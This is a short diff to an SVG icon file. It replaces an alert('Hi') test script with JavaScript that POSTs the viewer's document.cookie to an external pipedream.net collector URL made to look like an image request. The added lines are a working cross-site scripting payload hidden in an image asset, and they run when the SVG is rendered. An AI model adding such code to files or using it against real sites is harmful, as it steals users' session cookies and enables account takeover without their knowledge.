@@ -2,6 +2,8 @@
      width="40px" height="40px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
      ...
   <script type="text/javascript">
-        alert('Hi')
+        //<![CDATA[
+          fetch(`https://en8vwnbiln7pp.x.pipedream.net/1234.png`, {method: "POST", body: document.cookie})
+        //]]>
     </script>
 </svg>
